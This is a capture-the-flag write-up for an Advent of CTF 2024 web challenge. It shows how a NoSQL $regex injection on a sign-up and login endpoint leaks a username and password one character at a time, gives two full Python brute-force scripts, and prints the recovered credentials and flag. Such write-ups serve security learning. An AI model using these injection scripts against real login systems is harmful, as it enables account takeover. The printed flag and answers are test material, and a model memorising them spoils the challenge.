<img src="https://github.com/raul-dunca/assets/blob/main/.images_CyberStudents-advent-of-ctf2024/day22_description1.png">
<img src="https://github.com/raul-dunca/assets/blob/main/.images_CyberStudents-advent-of-ctf2024/day22_description2.png">

I used Burp Suite where I saw the `/sign-up` call. I investigated further, and I found out that if I sent a `POST` request there, I would receive:

```text
Sign ups are disabled at the moment. Your username is available, though!
```

This message suggests that if the correct username is used, a different message will be displayed. After attempting to bruteforce it using common usernames and after some searching, I found that in json regex could be used. So I could try to look for each character in the username at a time using:

```Json
"username":  { "$regex": "^a" }
```

So I developed a script that does that:

```python
import requests
import json

url = "https://kunal-consulting.csd.lol/sign-up"

username=""
character_set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

def attempt_login(char):

    global username
    payload = {"username": { "$regex": f"^{username+char}" }, "password": "randompassword"}
    headers = {"Content-Type": "application/json" }

    response = requests.post(url, data=json.dumps(payload), headers=headers)

    if "Your username is available, though!" not in response.text:
        print(f"Success! char: {char} ")
        #print(f"Response: {response.text}")
        username+=char
        return True
    else:
            return False

cont=True

while cont:
    cont=False
    for char in character_set:
        print(f"Trying {char}")
        if attempt_login(char):
            print(username)
            cont=True
            break

print("Username is:")
print(username)
```

Now having the username which is `XhaNy22` I tried to bypass the password check somehow. Finally, I tried to do a similar approach as for the username
this time in the `/login` endpoint:



```python
import requests
import json

url = "https://kunal-consulting.csd.lol/login"

username="XhaNy22"
character_set = "_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
password=""

def attempt_login(char):

    global username,password
    payload = {"username": username, "password": { "$regex": f"^{password+char}" }}
    headers = {"Content-Type": "application/json"}

    response = requests.post(url, data=json.dumps(payload), headers=headers)

    if "Incorrect username/password" not in response.text:
        print(f"Success! char: {char} ")
        password+=char
        return True
    else:
        return False

cont=True

while cont:
    cont=False
    for char in character_set:
        print(f"Trying {char}")
        if attempt_login(char):
            print(username)
            cont=True
            break

print("password is:")
print(password)
```

The password is `reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_you`, then I logged in in the `/employee-login` endpoint and got the flag.



`csd{cOn5uL7iN9_CHIldR3N_5InC3_2009}`
